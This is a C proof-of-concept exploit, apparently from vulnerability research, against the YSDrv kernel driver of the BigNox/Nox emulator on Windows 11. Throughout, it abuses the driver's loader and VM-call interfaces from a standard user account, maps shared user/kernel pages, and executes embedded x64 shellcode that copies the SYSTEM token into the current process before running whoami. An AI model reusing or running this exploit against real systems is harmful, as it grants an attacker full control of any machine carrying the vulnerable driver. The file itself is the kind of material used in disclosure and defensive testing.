/* YSDrv PoC for the tested driver pair on Windows 11 build 26200.
 * Run as a standard user on a disposable test system. Ends with whoami.
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define CTRL(fn,acc) ((0x22u<<16)|((acc)<<14)|(((fn)|128u)<<2))
typedef struct { uint32_t ck, sk, cbIn, cbOut, fFlags; int32_t rc; } HDR;

static const wchar_t* devpath(void) { return L"\\\\?\\GLOBALROOT\\Device\\YSDrv"; }

static const char module_path[] = "C:\\Program Files (x86)\\Bignox\\BigNoxVM\\RT\\YSR0.sys";
static const char module_name[] = "ysr0proof";
static unsigned char* g_qb;
static uint64_t g_wK1 = 0, g_wK2 = 0, g_wU1 = 0, g_wU2 = 0, g_wPVM = 0;
static uint32_t g_nfunc;

static uint64_t lookup_symbol(const char* name) {
  /* QUERY_FUNCS reply: cFunctions at +24, table at +32, entry = 40 bytes
     (name = 32 bytes NUL-padded, then uint64_t address). */
  for (uint32_t i = 0; i < g_nfunc && i < 512; i++) {
    char* e = (char*)(g_qb + 32 + (size_t)i * 40);
    if (strncmp(e, name, 31) == 0) return *(uint64_t*)(e + 32);
  }
  return 0;
}

static uint32_t find_export(const unsigned char* img, uint32_t lfanew, const char* want) {
  uint32_t expRva = *(uint32_t*)(img + lfanew + 24 + 112 + 0 * 8);
  uint32_t expSz  = *(uint32_t*)(img + lfanew + 24 + 112 + 0 * 8 + 4);
  if (!expRva || !expSz) return 0;
  uint32_t nNames = *(uint32_t*)(img + expRva + 24);
  uint32_t pNames = *(uint32_t*)(img + expRva + 32);
  uint32_t pOrds  = *(uint32_t*)(img + expRva + 36);
  uint32_t pFuncs = *(uint32_t*)(img + expRva + 28);
  for (uint32_t i = 0; i < nNames && i < 4096; i++) {
    uint32_t nameRva = *(uint32_t*)(img + pNames + i * 4);
    const char* nm = (const char*)(img + nameRva);
    if (nm[0] && strncmp(nm, want, 63) == 0) {
      uint16_t ord = *(uint16_t*)(img + pOrds + i * 2);
      uint32_t rva = *(uint32_t*)(img + pFuncs + ord * 4);
      return rva;
    }
  }
  return 0;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  HANDLE f = CreateFileA(module_path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if (f == INVALID_HANDLE_VALUE) { printf("[-] cannot read module err=%lu\n", GetLastError()); return 1; }
  static unsigned char raw[8*1024*1024]; DWORD got = 0;
  ReadFile(f, raw, sizeof(raw), &got, NULL); CloseHandle(f);
  if (got < 0x200) { printf("[-] payload too small"); fputc(10, stdout); return 1; }

  uint32_t lfanew = *(uint32_t*)(raw + 0x3C);
  uint16_t nsec   = *(uint16_t*)(raw + lfanew + 6);
  uint16_t optsz  = *(uint16_t*)(raw + lfanew + 20);
  uint32_t IMG_BITS = *(uint32_t*)(raw + lfanew + 24 + 56);
  uint64_t prefBase = *(uint64_t*)(raw + lfanew + 24 + 24);
  uint32_t hdrsz  = *(uint32_t*)(raw + lfanew + 24 + 60);

  /* open device + session */
  HANDLE h = CreateFileW(devpath(), GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if (h == INVALID_HANDLE_VALUE) { printf("[-] cannot open YSDrv err=%lu\n", GetLastError()); return 2; }
  DWORD ret = 0;
  unsigned char cbuf[64]; memset(cbuf, 0, sizeof(cbuf)); HDR* ch = (HDR*)cbuf;
  ch->ck = 0x69726F74; ch->sk = 0x11223344; ch->cbIn = 48; ch->cbOut = 56; ch->fFlags = 0x42000042;
  memcpy(cbuf + 24, "The Magic Word!", 16);
  *(uint32_t*)(cbuf + 40) = 0x290001; *(uint32_t*)(cbuf + 44) = 0x290001;   /* uVersion / uMinVersion (Nox YSDrv) */
  BOOL ok = DeviceIoControl(h, CTRL(1, 2), cbuf, 48, cbuf, 56, &ret, NULL);
  if (!ok || ch->rc != 0) { printf("[-] COOKIE failed rc=0x%08X\n", (unsigned)ch->rc); return 3; }
  uint32_t devck = *(uint32_t*)(cbuf + 24), sess = *(uint32_t*)(cbuf + 28);
  static uint64_t g_pSession = 0;
  g_pSession = *(uint64_t*)(cbuf + 48);   /* COOKIE reply +48 = pSession */
  g_qb = (unsigned char*)calloc(1, 12000);
  HDR* qh = (HDR*)g_qb; qh->ck = devck; qh->sk = sess; qh->cbIn = 24; qh->cbOut = 11032; qh->fFlags = 0x42000042;
  BOOL qok = DeviceIoControl(h, CTRL(2, 2), g_qb, 24, g_qb, 11032, &ret, NULL);
  g_nfunc = *(uint32_t*)(g_qb + 24);
  if (!qok || qh->rc != 0 || g_nfunc > 275) { printf("[-] QUERY_FUNCS failed\n"); CloseHandle(h); return 3; }

  /* LDR_OPEN */
  uint32_t CB_EVERYTHING = IMG_BITS + 0x1000;
  static unsigned char ob[512]; memset(ob, 0, sizeof(ob));
  HDR* oh = (HDR*)ob; oh->ck = devck; oh->sk = sess; oh->cbIn = 328; oh->cbOut = 40; oh->fFlags = 0x42000042;
  *(uint32_t*)(ob + 24) = CB_EVERYTHING;
  *(uint32_t*)(ob + 28) = IMG_BITS;
  memcpy(ob + 32, module_name, sizeof(module_name));
  memcpy(ob + 64, module_path, sizeof(module_path));
  SetLastError(0);
  ok = DeviceIoControl(h, CTRL(3, 2), ob, 328, ob, 40, &ret, NULL);
  DWORD winerr = ok ? 0 : GetLastError();
  uint64_t imageBase = *(uint64_t*)(ob + 24);
  if (!ok || oh->rc != 0 || imageBase == 0) {
    printf("[-] LDR_OPEN ok=%d rc=%d (0x%08X) winerr=%lu base=0x%llX name=%s\n",
           ok, (int)oh->rc, (unsigned)oh->rc, winerr,
           (unsigned long long)imageBase, module_name);
    CloseHandle(h); return 4;
  }

  /* build the image bits */
  uint32_t cbAll = CB_EVERYTHING, total = 108 + cbAll;   /* driver: cbIn == cbImageWithTabs + 108 */
  unsigned char* lb = (unsigned char*)calloc(1, total);
  unsigned char* img = lb + 108;
  if (hdrsz > IMG_BITS) hdrsz = IMG_BITS;
  memcpy(img, raw, hdrsz);
  for (uint16_t i = 0; i < nsec; i++) {
    const unsigned char* sh = raw + lfanew + 24 + optsz + (uint32_t)i * 40;
    uint32_t vsize = *(uint32_t*)(sh + 8), rva = *(uint32_t*)(sh + 12);
    uint32_t rawsz = *(uint32_t*)(sh + 16), rawoff = *(uint32_t*)(sh + 20);
    uint32_t n = (vsize && vsize < rawsz) ? vsize : rawsz;
    if (rva >= IMG_BITS) continue;
    if (rva + n > IMG_BITS) n = IMG_BITS - rva;
    if (rawoff + n <= got) memcpy(img + rva, raw + rawoff, n);
  }
  int64_t delta = (int64_t)imageBase - (int64_t)prefBase;
  uint32_t relRva = *(uint32_t*)(raw + lfanew + 24 + 112 + 5 * 8);
  uint32_t relSz  = *(uint32_t*)(raw + lfanew + 24 + 112 + 5 * 8 + 4);
  for (uint32_t off = 0; relRva && off + 8 <= relSz; ) {
    uint32_t pageRva = *(uint32_t*)(img + relRva + off);
    uint32_t blkSz   = *(uint32_t*)(img + relRva + off + 4);
    if (blkSz < 8 || off + blkSz > relSz) break;
    for (uint32_t e = 8; e + 2 <= blkSz; e += 2) {
      uint16_t ent = *(uint16_t*)(img + relRva + off + e);
      if ((ent >> 12) != 10) continue;
      uint32_t tgt = pageRva + (ent & 0xFFF);
      if (tgt + 8 > IMG_BITS) continue;
      *(uint64_t*)(img + tgt) += delta;
    }
    off += blkSz;
  }
  *(uint64_t*)(img + lfanew + 48) = imageBase;

  /* Resolve the QUERY_FUNCS import slots in the loaded image. */
  for (uint32_t off = 0; off + 8 <= IMG_BITS; off += 8) {
    uint64_t v = *(uint64_t*)(img + off);
    if (v < 0x200 || v >= IMG_BITS - 4) continue;
    const char* nm = (const char*)(img + (uint32_t)v + 2);
    uint64_t addr = lookup_symbol(nm);
    if (!addr) { nm = (const char*)(img + (uint32_t)v); addr = lookup_symbol(nm); }
    if (addr) *(uint64_t*)(img + off) = addr;
  }

  /* LDR_LOAD */
  uint32_t modInitRva = find_export(img, lfanew, "ModuleInit");
  uint32_t modFastRva = find_export(img, lfanew, "VMMR0EntryFast");
  uint32_t modExRva   = find_export(img, lfanew, "VMMR0EntryEx");
  if (!modInitRva || !modFastRva || !modExRva) { printf("[-] required exports not found\n"); CloseHandle(h); return 5; }
  HDR* lh = (HDR*)lb; lh->ck = devck; lh->sk = sess; lh->cbIn = total; lh->cbOut = 2080; lh->fFlags = 0x42000042;
  /* Observed LDR_LOAD layout for the tested YSDrv build; all entry addresses
     must lie within the loaded image. Zero-filled fields stay zero. */
  *(uint64_t*)(lb + 24)  = imageBase + modInitRva;
  *(uint64_t*)(lb + 40)  = imageBase + modInitRva;
  *(uint64_t*)(lb + 48)  = imageBase + modFastRva;
  *(uint64_t*)(lb + 56)  = imageBase + modExRva;
  *(uint64_t*)(lb + 72)  = imageBase;
  *(uint32_t*)(lb + 80)  = 1;                       /* VMMR0 */

  *(uint32_t*)(lb + 84)  = IMG_BITS;                /* cbImageBits (must match LDR_OPEN) */
  *(uint32_t*)(lb + 104) = cbAll;                   /* cbImageWithTabs (must match LDR_OPEN) */
  ok = DeviceIoControl(h, CTRL(4, 2), lb, total, lb, 2080, &ret, NULL);
  if (!ok || lh->rc != 0) { printf("[-] LDR_LOAD failed rc=0x%08X\n", (unsigned)lh->rc); CloseHandle(h); return 6; }

  /* CALL_VMMR0_BIG operation 32 creates a VM for this session. */
  {
    static unsigned char b5[0x100]; memset(b5, 0, sizeof(b5));
    HDR* h5 = (HDR*)b5;
    unsigned char* vmm = b5 + 48;
    uint32_t cb = 48 + 40;                    /* == u32Size+48 */
    *(uint64_t*)(b5 + 24) = 0;                /* pVMR0 = 0 -> the (0,0,...) branch */
    *(uint32_t*)(b5 + 32) = 0xFFFFFFFD;       /* idCpu = -3 (NIL_VMCPUID) */
    *(uint32_t*)(b5 + 36) = 32;               /* op = VMMR0_DO_GVM_REQUEST */
    *(uint64_t*)(b5 + 40) = 0;                /* pvArg2 = 0 */
    *(uint32_t*)(vmm + 0) = 426967569;        /* SUPVMMR0REQHDR_MAGIC */
    *(uint32_t*)(vmm + 4) = 40;               /* u32Size == 40 */
    *(uint64_t*)(vmm + 8) = g_pSession;       /* pVMReq+8 = pSession (leaked) */
    *(uint32_t*)(vmm + 16) = 1;               /* cCpus = 1 */
    h5->ck = devck; h5->sk = sess; h5->cbIn = cb; h5->cbOut = cb; h5->fFlags = 0x42000042;
    BOOL o5 = DeviceIoControl(h, 0x22826C, b5, cb, b5, cb, &ret, NULL);
    uint64_t pVM = *(uint64_t*)(vmm + 32);
    if (!o5 || h5->rc != 0 || !pVM) { printf("[-] VM creation failed\n"); CloseHandle(h); return 7; }
    g_wPVM = pVM;
    /* register this VM for fast calls (session+72) */
    static unsigned char b6[64]; memset(b6, 0, sizeof(b6));
    HDR* h6 = (HDR*)b6;
    *(uint64_t*)(b6 + 24) = pVM;
    h6->ck = devck; h6->sk = sess; h6->cbIn = 32; h6->cbOut = 24; h6->fFlags = 0x42000042;
    BOOL o6 = DeviceIoControl(h, 0x22824C, b6, 32, b6, 24, &ret, NULL);
    if (!o6 || h6->rc != 0) { printf("[-] SET_VM_FOR_FAST failed\n"); CloseHandle(h); return 7; }
  }

  /* Allocate two pages mapped in both user and kernel address spaces. */
  for (uint32_t np = 1; np <= 2; np++) {
      static unsigned char ab[0x200]; memset(ab, 0, sizeof(ab));
      HDR* ah = (HDR*)ab;
      uint32_t cbo = 8 * np + 40;
      *(uint32_t*)(ab + 24) = np;
      *(uint8_t*)(ab + 28) = 1;
      *(uint8_t*)(ab + 29) = 1;
      ah->ck = devck; ah->sk = sess; ah->cbIn = 32; ah->cbOut = cbo; ah->fFlags = 0x42000042;
      BOOL ao = DeviceIoControl(h, 0x228228, ab, 32, ab, cbo, &ret, NULL);
      if (!ao || ah->rc != 0 || !*(uint64_t*)(ab+24) || !*(uint64_t*)(ab+32)) {
        printf("[-] PAGE_ALLOC_EX failed\n"); CloseHandle(h); return 8;
      }
      if (np == 1) { g_wK1 = *(uint64_t*)(ab+32); g_wU1 = *(uint64_t*)(ab+24); }
      else { g_wK2 = *(uint64_t*)(ab+32); g_wU2 = *(uint64_t*)(ab+24); }
  }

  /* Execute the token swap only after the marker confirms the call path. */
  if (!g_wPVM || !g_wK1 || !g_wU1 || !g_wK2 || !g_wU2) { CloseHandle(h); return 8; }
  {
    unsigned char sc_marker[20] = {
      0x48,0x89,0xC8,
      0x48,0xB9,0x48,0x47,0x46,0x45,0x44,0x43,0x42,0x41,
      0x48,0x89,0x08,0xC3 };
    unsigned char sc_system[64] = {
      0x65,0x48,0x8B,0x04,0x25,0x88,0x01,0x00,0x00,
      0x48,0x8B,0x80,0xB8,0x00,0x00,0x00,
      0x48,0x89,0xC2,
      0x48,0x8B,0x88,0xD8,0x01,0x00,0x00,
      0x48,0x8B,0x09,
      0x48,0x89,0xC8,
      0x48,0x2D,0xD8,0x01,0x00,0x00,
      0x48,0x83,0xB8,0xD0,0x01,0x00,0x00,0x04,
      0x75,0xEA,
      0x48,0x8B,0x80,0x48,0x02,0x00,0x00,
      0x48,0x89,0x82,0x48,0x02,0x00,0x00,
      0xC3 };
    static unsigned char xb[0x100]; memset(xb, 0, sizeof(xb));
    HDR* xh = (HDR*)xb;
    uint32_t cbx = 80;
    *(uint64_t*)(xb + 24) = g_wPVM;
    *(uint32_t*)(xb + 32) = 0xFFFFFFFD;
    *(uint32_t*)(xb + 36) = 320;
    *(uint64_t*)(xb + 40) = 0;
    *(uint32_t*)(xb + 48) = 426967569;
    *(uint32_t*)(xb + 52) = 32;
    *(uint64_t*)(xb + 56) = g_wK1;
    *(uint64_t*)(xb + 72) = g_wK2;
    xh->ck = devck; xh->sk = sess; xh->cbIn = cbx; xh->cbOut = cbx; xh->fFlags = 0x42000042;
    static unsigned char pb[0x40]; memset(pb, 0, sizeof(pb));
    HDR* ph = (HDR*)pb;
    *(uint64_t*)(pb + 24) = g_wU2;
    *(uint64_t*)(pb + 32) = g_wK2;
    *(uint32_t*)(pb + 40) = 0;
    *(uint32_t*)(pb + 44) = 0x1000;
    *(uint32_t*)(pb + 48) = 7;
    ph->ck = devck; ph->sk = sess; ph->cbIn = 56; ph->cbOut = 56; ph->fFlags = 0x42000042;
    DeviceIoControl(h, 0x228230, pb, 56, pb, 56, &ret, NULL);
    uint64_t* k1 = (uint64_t*)g_wU1;
    memcpy((void*)g_wU2, sc_marker, sizeof(sc_marker));
    k1[136/8] = g_wPVM;
    k1[168/8] = g_wK2;
    k1[0] = 0;
    DeviceIoControl(h, 0x22826C, xb, cbx, xb, cbx, &ret, NULL);
    if (k1[0] != 0x4142434445464748ULL) {
      printf("[-] kernel-call marker failed\n"); CloseHandle(h); return 9;
    }
    memcpy((void*)g_wU2, sc_system, sizeof(sc_system));
    k1[0] = 0;
    DeviceIoControl(h, 0x22826C, xb, cbx, xb, cbx, &ret, NULL);
  }
  /* Print the current identity. */
  int result = system("whoami");
  CloseHandle(h);
  return result == 0 ? 0 : 10;
}
